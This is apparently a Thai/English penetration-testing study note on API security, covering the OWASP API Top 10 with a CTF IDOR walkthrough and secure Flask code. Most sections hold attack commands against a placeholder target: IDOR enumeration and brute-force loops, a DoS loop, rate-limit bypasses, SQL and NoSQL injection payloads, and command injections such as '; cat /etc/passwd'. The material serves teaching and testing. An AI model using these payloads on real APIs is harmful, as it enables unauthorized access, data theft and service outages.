# API Security

## What is API Security?
API Security หมายถึงการรักษาความปลอดภัยของ Application Programming Interfaces (APIs) จากการโจมตีและการใช้งานในทางที่ผิด โดยครอบคลุมทั้ง authentication, authorization, input validation, rate limiting, และการป้องกันช่องโหว่ต่างๆ ที่เฉพาะกับ API

APIs เป็นเป้าหมายหลักของ attackers เนื่องจาก:
- เปิดเผยข้อมูลและ functionality โดยตรง
- มักถูกใช้โดย mobile apps และ third-party integrations
- อาจมี authentication ที่อ่อนแอกว่า web interface
- เป็นทางเข้าสู่ backend systems และ databases

> [!info] API Types
> - **REST APIs**: HTTP-based, stateless, ใช้ JSON/XML
> - **GraphQL APIs**: Query language สำหรับ APIs
> - **SOAP APIs**: XML-based web services
> - **WebSocket APIs**: Real-time bidirectional communication
> - **gRPC APIs**: High-performance RPC framework

## Landmark
API vulnerabilities มักพบใน:
- RESTful API endpoints (`/api/v1/*`, `/api/v2/*`)
- GraphQL endpoints (`/graphql`, `/api/graphql`)
- Mobile API backends (`/mobile/api/*`, `/app/api/*`)
- Microservices communications
- Third-party API integrations
- Public API documentation (`/docs`, `/swagger`, `/api-docs`)
- API versioning endpoints
- WebSocket connections (`wss://`)

**Common API Paths:**
```
/api/v1/users
/api/v1/admin
/api/v2/data
/graphql
/api/graphql/v1
/swagger/v1/swagger.json
/api-docs
/openapi.json
```

**Detection Methods:**
```bash
# API endpoint discovery
ffuf -u https://target.com/api/FUZZ -w wordlist.txt

# API documentation discovery
curl https://target.com/swagger/v1/swagger.json
curl https://target.com/api-docs
curl https://target.com/.well-known/openapi.json
```

## Types of API Security Vulnerabilities

### 1. Broken Object Level Authorization (BOLA/IDOR)
API ไม่ validate ว่า user มีสิทธิ์เข้าถึง object ที่ request หรือไม่

**Attack Vector:**
```http
GET /api/v1/users/123/profile HTTP/1.1
Authorization: Bearer <user456_token>

# Change user ID to access other user's data
GET /api/v1/users/456/profile HTTP/1.1
Authorization: Bearer <user123_token>
```

**Exploitation Examples:**
```bash
# Test different user IDs
for id in {1..100}; do
  curl -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/users/$id/profile"
done

# Test UUID/GUID patterns
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/orders/f47ac10b-58cc-4372-a567-0e02b2c3d479"

# Test with different object types
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.target.com/v1/invoices/12345"
```

**Common IDOR Locations:**
- User profiles: `/api/users/{id}`
- Orders: `/api/orders/{id}`
- Documents: `/api/documents/{id}`
- Messages: `/api/messages/{id}`
- Invoices: `/api/invoices/{id}`
- Admin functions: `/api/admin/users/{id}`

> [!warning] BOLA Impact
> BOLA/IDOR เป็นช่องโหว่ที่พบบ่อยที่สุดใน APIs และอาจทำให้:
> - เข้าถึงข้อมูลของ users อื่นได้
> - แก้ไขหรือลบข้อมูลของผู้อื่น
> - Privilege escalation
> - Data breach ขนาดใหญ่

### 2. Broken Authentication
Authentication mechanisms ที่มีช่องโหว่

**Vulnerable Patterns:**
```bash
# Weak JWT implementation
Authorization: Bearer eyJhbGci...

# API keys in URLs (logged in history)
https://api.target.com/data?api_key=secret123

# No authentication required
curl https://api.target.com/v1/admin/users

# Predictable tokens
Token: user123_20240617_001
```

**Attack Scenarios:**

**1. API Key Leakage:**
```bash
# Check for API keys in:
# - GitHub repositories
# - Mobile app code (decompiled APK/IPA)
# - JavaScript files
# - HTTP headers in logs
# - URL parameters

# Search GitHub
git clone https://github.com/target/repo
grep -r "api_key\|apikey\|api-key" .
grep -r "secret\|token" .
```

**2. JWT Vulnerabilities:**
```python
# See [[JWT Vulnerabilities]] for detailed attacks
import jwt

# Algorithm confusion
token = jwt.encode(payload, secret="", algorithm="none")

# Weak secret cracking
# Using jwt_tool or hashcat
```

**3. Session Token Prediction:**
```python
# Analyze token patterns
tokens = [
    "user1_20240617_001",
    "user1_20240617_002",
    "user1_20240617_003"
]

# Predict next token
next_token = "user1_20240617_004"
```

### 3. Excessive Data Exposure
API ส่งข้อมูลมากเกินไป หรือส่งข้อมูล sensitive ที่ไม่จำเป็น

**Example:**
```json
// Request: GET /api/v1/users/123
// Response exposes sensitive data:
{
  "id": 123,
  "username": "john",
  "email": "john@example.com",
  "password_hash": "$2b$10$...",  // Should not expose
  "api_key": "sk_live_...",        // Should not expose
  "ssn": "123-45-6789",            // Should not expose
  "credit_card": "4111-1111-1111-1111",
  "internal_id": "EMP-2024-001",
  "salary": 75000,
  "role_permissions": [...],
  "created_at": "2024-01-01",
  "last_login_ip": "192.168.1.1"
}
```

**Detection:**
```bash
# Compare API responses with what's displayed
curl https://api.target.com/v1/users/me | jq

# Check for hidden/unused fields
# Look for:
# - password fields (hash, encrypted, etc.)
# - internal IDs
# - PII data
# - Administrative fields
# - Debug information
```

### 4. Lack of Resources & Rate Limiting
API ไม่จำกัด rate หรือ resource usage

**Attack Vectors:**
```bash
# Brute force attacks
for pass in $(cat passwords.txt); do
  curl -X POST https://api.target.com/v1/login \
    -d "{\"username\":\"admin\",\"password\":\"$pass\"}"
done

# Denial of Service
while true; do
  curl https://api.target.com/v1/expensive-query &
done

# Mass data extraction
for id in {1..1000000}; do
  curl https://api.target.com/v1/users/$id >> dump.txt
done
```

**Rate Limit Bypass Techniques:**
```bash
# 1. Change IP address (rotate proxies)
curl -x proxy1:8080 https://api.target.com/

# 2. Change User-Agent
curl -H "User-Agent: Mozilla/..." https://api.target.com/

# 3. Use multiple API keys
curl -H "X-API-Key: key1" https://api.target.com/
curl -H "X-API-Key: key2" https://api.target.com/

# 4. Bypass rate limit headers
# Remove or modify:
# X-RateLimit-Limit
# X-RateLimit-Remaining
# X-Forwarded-For

# 5. Null byte injection in endpoints
curl https://api.target.com/v1/users%00

# 6. Case sensitivity bypass
curl https://api.target.com/V1/users
curl https://api.target.com/API/v1/users
```

> [!tip] Rate Limit Testing
> Check response headers สำหรับ rate limit info:
> - `X-RateLimit-Limit`: Maximum requests allowed
> - `X-RateLimit-Remaining`: Remaining requests
> - `X-RateLimit-Reset`: Timestamp when limit resets
> - `Retry-After`: Seconds to wait before retry

### 5. Broken Function Level Authorization
API ไม่ validate ว่า user มีสิทธิ์เรียกใช้ function นั้นหรือไม่

**Attack Examples:**
```bash
# Regular user accessing admin functions
curl -H "Authorization: Bearer <user_token>" \
  https://api.target.com/v1/admin/users

# Testing different HTTP methods
curl -X GET https://api.target.com/v1/users/123    # Allowed
curl -X DELETE https://api.target.com/v1/users/123  # Test this
curl -X PUT https://api.target.com/v1/users/123     # Test this

# Accessing different API versions
curl https://api.target.com/v1/admin/config  # Blocked
curl https://api.target.com/v2/admin/config  # Maybe allowed?

# Parameter pollution
curl "https://api.target.com/v1/users?id=123&role=admin"
```

**Common Admin Endpoints to Test:**
```
/api/v1/admin
/api/v1/admin/users
/api/v1/admin/settings
/api/v1/admin/logs
/api/v1/admin/debug
/api/v1/internal
/api/v1/management
/api/v1/superuser
```

### 6. Mass Assignment
API อนุญาตให้ clients ส่ง/แก้ไข fields ที่ไม่ควรอนุญาต

**Vulnerable Code Pattern:**
```python
# Vulnerable: Mass assignment without filtering
@app.route('/api/v1/users', methods=['POST'])
def create_user():
    user = User(**request.json)  # Dangerous!
    db.session.add(user)
    db.session.commit()
```

**Exploitation:**
```bash
# Normal request
curl -X POST https://api.target.com/v1/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "newuser",
    "email": "user@example.com",
    "password": "pass123"
  }'

# Mass assignment attack - add admin fields
curl -X POST https://api.target.com/v1/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "newuser",
    "email": "user@example.com",
    "password": "pass123",
    "is_admin": true,
    "role": "administrator",
    "credits": 999999,
    "verified": true
  }'

# Update profile with mass assignment
curl -X PUT https://api.target.com/v1/users/me \
  -H "Authorization: Bearer <token>" \
  -d '{
    "username": "updated",
    "is_admin": true,
    "account_balance": 1000000
  }'
```

**Fields to Test:**
- `is_admin`, `admin`, `is_superuser`
- `role`, `user_role`, `account_type`
- `permissions`, `privileges`
- `verified`, `is_verified`, `email_verified`
- `credits`, `balance`, `account_balance`
- `discount`, `price`, `cost`

### 7. Security Misconfiguration
API configurations ที่ไม่ปลอดภัย

**Common Issues:**
```bash
# 1. Verbose error messages
curl https://api.target.com/v1/invalid
# Response exposes stack traces, SQL queries, file paths

# 2. CORS misconfiguration (see [[CORS Misconfiguration]])
curl -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -X OPTIONS https://api.target.com/v1/data

# 3. Unnecessary HTTP methods enabled
curl -X OPTIONS https://api.target.com/v1/users
curl -X TRACE https://api.target.com/v1/users

# 4. Directory listing
curl https://api.target.com/api/
curl https://api.target.com/api/v1/

# 5. Debug endpoints exposed
curl https://api.target.com/debug
curl https://api.target.com/api/debug
curl https://api.target.com/api/v1/_debug
```

**Information Disclosure:**
```bash
# API documentation exposed
https://api.target.com/docs
https://api.target.com/swagger
https://api.target.com/api-docs
https://api.target.com/redoc

# Health/status endpoints
https://api.target.com/health
https://api.target.com/status
https://api.target.com/api/health
https://api.target.com/metrics

# Version information
curl -I https://api.target.com/
# Look for: X-Powered-By, Server, X-API-Version headers
```

### 8. Injection Flaws
API vulnerable to injection attacks

**SQL Injection:**
```bash
# In query parameters
curl "https://api.target.com/v1/users?id=1' OR '1'='1"
curl "https://api.target.com/v1/search?q=admin'--"

# In JSON body
curl -X POST https://api.target.com/v1/login \
  -d '{"username":"admin'\'' OR 1=1--","password":"x"}'

# Time-based SQLi
curl "https://api.target.com/v1/users?id=1' AND SLEEP(5)--"
```

**NoSQL Injection:**
```bash
# MongoDB injection
curl -X POST https://api.target.com/v1/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$ne": null},
    "password": {"$ne": null}
  }'

# Bypass authentication
curl -X POST https://api.target.com/v1/login \
  -d '{
    "username": {"$gt": ""},
    "password": {"$gt": ""}
  }'
```

**Command Injection:**
```bash
# In file operations
curl "https://api.target.com/v1/export?filename=data.csv;whoami"
curl "https://api.target.com/v1/download?file=report.pdf|id"

# In system commands
curl -X POST https://api.target.com/v1/ping \
  -d '{"host":"127.0.0.1; cat /etc/passwd"}'
```

## Exploitation Techniques

### API Enumeration
```bash
# 1. Find API endpoints
# Using ffuf
ffuf -u https://target.com/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Using gobuster
gobuster dir -u https://target.com/api \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 2. Discover API versions
for v in {1..10}; do
  curl -I "https://target.com/api/v$v/"
done

# 3. Extract endpoints from JavaScript
curl https://target.com/app.js | grep -oP '"/api/[^"]*"'

# 4. Use Swagger/OpenAPI docs
curl https://target.com/swagger/v1/swagger.json | jq
```

### API Testing Workflow
```bash
# 1. Capture API request with Burp Suite
# 2. Analyze request structure
# 3. Test each vulnerability type

# Authentication Testing
curl -X POST https://api.target.com/v1/login \
  -d '{"username":"admin","password":"admin"}'

# Authorization Testing (IDOR)
# Get your user ID: 123
curl -H "Authorization: Bearer $TOKEN" \
  https://api.target.com/v1/users/123

# Try other IDs: 1, 100, 124, etc.
curl -H "Authorization: Bearer $TOKEN" \
  https://api.target.com/v1/users/1

# Input Validation Testing
curl -X POST https://api.target.com/v1/users \
  -d '{"username":"test'\''--","email":"test@test.com"}'

# Rate Limiting Testing
for i in {1..1000}; do
  curl https://api.target.com/v1/data &
done
```

### Automated API Security Testing
```bash
# OWASP ZAP API scan
zap-cli quick-scan --self-contained \
  --spider --ajax-spider \
  https://api.target.com

# Nuclei templates for APIs
nuclei -u https://api.target.com -t api/ -t cves/

# Postman collection testing
newman run api-tests.json --environment prod.json

# GraphQL testing (see [[GraphQL Injection]])
python3 graphql-cop.py -t https://target.com/graphql
```

### API Fuzzing
```python
import requests
import itertools

# Fuzz API parameters
base_url = "https://api.target.com/v1/users"
params = {
    'id': ['1', '999', '-1', '0', '1.1', "'", '"', 'admin'],
    'format': ['json', 'xml', 'html', '../../../etc/passwd'],
    'limit': ['10', '999999', '-1', '0'],
}

for combo in itertools.product(*params.values()):
    param_dict = dict(zip(params.keys(), combo))
    response = requests.get(base_url, params=param_dict)
    if response.status_code != 400:
        print(f"Interesting response for {param_dict}: {response.status_code}")
```

## Related Topics
- [[JWT Vulnerabilities]] - JWT authentication attacks
- [[Authentication Bypass]] - Authentication vulnerabilities
- [[CORS Misconfiguration]] - Cross-origin issues
- [[SQL Injection]] - Database injection in APIs
- [[NoSQL Injection]] - NoSQL database attacks
- [[GraphQL Injection]] - GraphQL-specific attacks
- [[Server Side Request Forgery (SSRF)]] - SSRF in APIs
- [[XML External Entity (XXE)]] - XML processing vulnerabilities

## Tools

### API Discovery & Testing
- **Postman**: API development and testing platform
- **Burp Suite**: Web vulnerability scanner with API testing
- **OWASP ZAP**: Free security scanner
- **Swagger UI**: API documentation and testing
- **Insomnia**: API client and testing tool

### Specialized API Tools
```bash
# Install tools
pip install arjun          # API parameter discovery
pip install ffuf           # Fast fuzzer
pip install nuclei         # Vulnerability scanner
npm install -g newman      # Postman CLI

# Arjun - Find hidden API parameters
arjun -u https://api.target.com/v1/users

# ffuf - Endpoint discovery
ffuf -u https://target.com/api/FUZZ \
  -w wordlist.txt \
  -mc 200,201,202,204,301,302,307,401,403

# nuclei - Automated scanning
nuclei -u https://api.target.com -t ~/nuclei-templates/
```

### GraphQL Tools
- **GraphQL Voyager**: GraphQL schema visualizer
- **GraphiQL**: GraphQL IDE
- **InQL**: Burp extension for GraphQL
- **graphql-cop**: GraphQL security auditing

## CTF Example: IDOR in API

**Scenario:** REST API สำหรับ online banking ที่มี IDOR vulnerability

**Challenge:**
```
URL: http://ctf.example.com:5000/
Credentials: user1 / password123
Goal: Access other users' account information
```

**Solution:**

1. **Login and capture request:**
```bash
curl -X POST http://ctf.example.com:5000/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password123"}'

# Response:
{
  "token": "eyJhbGci...",
  "user_id": 1001,
  "message": "Login successful"
}
```

2. **Enumerate API endpoints:**
```bash
# Check your account info
curl -H "Authorization: Bearer eyJhbGci..." \
  http://ctf.example.com:5000/api/v1/account/1001

# Response:
{
  "id": 1001,
  "username": "user1",
  "balance": 1000.00,
  "account_number": "ACC-1001"
}
```

3. **Test IDOR vulnerability:**
```bash
# Try different account IDs
for id in {1000..1010}; do
  echo "Testing ID: $id"
  curl -s -H "Authorization: Bearer eyJhbGci..." \
    "http://ctf.example.com:5000/api/v1/account/$id" | jq
done
```

4. **Results:**
```json
// ID 1005 reveals admin account!
{
  "id": 1005,
  "username": "admin",
  "balance": 999999.99,
  "account_number": "ACC-ADMIN",
  "flag": "CTF{AP1_1D0R_br0k3n_auth0r1z4t10n}"
}
```

> [!success] Key Findings
> 1. API ไม่ validate ว่า authenticated user เป็นเจ้าของ resource หรือไม่
> 2. Sequential IDs ทำให้ enumerate ได้ง่าย
> 3. Response ส่ง flag กลับมาในข้อมูล admin account
> 4. ไม่มี rate limiting ทำให้ brute force IDs ได้

## Prevention

### Secure API Design
```python
from flask import Flask, request, jsonify
from functools import wraps
import jwt

app = Flask(__name__)

# 1. Input validation
from marshmallow import Schema, fields, validate

class UserSchema(Schema):
    username = fields.Str(required=True, validate=validate.Length(min=3, max=50))
    email = fields.Email(required=True)
    role = fields.Str(validate=validate.OneOf(['user', 'moderator']))  # Don't allow 'admin'

# 2. Authorization middleware
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        if not token:
            return jsonify({'error': 'No token provided'}), 401
        
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
            request.user = payload
        except jwt.InvalidTokenError:
            return jsonify({'error': 'Invalid token'}), 401
        
        return f(*args, **kwargs)
    return decorated

# 3. Object-level authorization
@app.route('/api/v1/users/<int:user_id>', methods=['GET'])
@require_auth
def get_user(user_id):
    # Check ownership
    if request.user['id'] != user_id and request.user['role'] != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403
    
    user = User.query.get_or_404(user_id)
    
    # 4. Filter sensitive data based on role
    if request.user['role'] != 'admin':
        user_data = {
            'id': user.id,
            'username': user.username,
            'email': user.email
        }
    else:
        user_data = user.to_dict()
    
    return jsonify(user_data)

# 5. Rate limiting
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.headers.get('Authorization'))

@app.route('/api/v1/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Login logic
    pass
```

### API Security Best Practices
1. **Authentication & Authorization:**
   - Use strong authentication (OAuth 2.0, JWT with proper validation)
   - Implement proper authorization checks at every endpoint
   - Never trust client-sent data for authorization decisions

2. **Input Validation:**
   - Validate all inputs (type, format, range, length)
   - Use allow-lists over deny-lists
   - Sanitize inputs to prevent injection

3. **Rate Limiting & Resource Management:**
   - Implement rate limiting per user/IP/API key
   - Set timeouts for API calls
   - Limit payload sizes
   - Implement pagination for large datasets

4. **Data Exposure:**
   - Return only necessary data
   - Filter responses based on user role
   - Never expose sensitive data (passwords, keys, internal IDs)
   - Use field-level permissions

5. **Security Headers & Configuration:**
   - Use HTTPS only
   - Implement proper CORS policies
   - Disable unnecessary HTTP methods
   - Remove verbose error messages in production
   - Hide API version information

## References
- OWASP API Security Top 10
- OWASP API Security Project
- REST API Security Cheat Sheet
- GraphQL Security Best Practices
- API Security Testing Guide

---
**Tags:** #api #rest #graphql #web #authentication #authorization #idor
**Difficulty:** Medium
**OWASP:** API Security Top 10 2023
